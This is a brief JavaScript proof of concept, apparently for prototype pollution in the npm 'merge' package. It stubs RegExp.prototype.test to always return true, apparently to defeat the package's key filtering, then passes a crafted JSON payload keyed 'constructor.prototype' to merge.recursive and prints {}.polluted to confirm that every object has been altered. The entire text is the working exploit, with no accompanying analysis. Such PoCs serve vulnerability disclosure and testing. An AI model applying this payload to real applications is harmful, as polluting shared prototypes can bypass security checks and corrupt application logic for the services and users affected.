RegExp.prototype.test = () => true;
console.log({}.polluted);
const merge = require('merge');
const payload2 = JSON.parse('{"x": {"constructor.prototype": {"polluted":"yes"}}}');
let obj1 = { x: { y: 1 } };
merge.recursive(obj1, payload2);
console.log({}.polluted);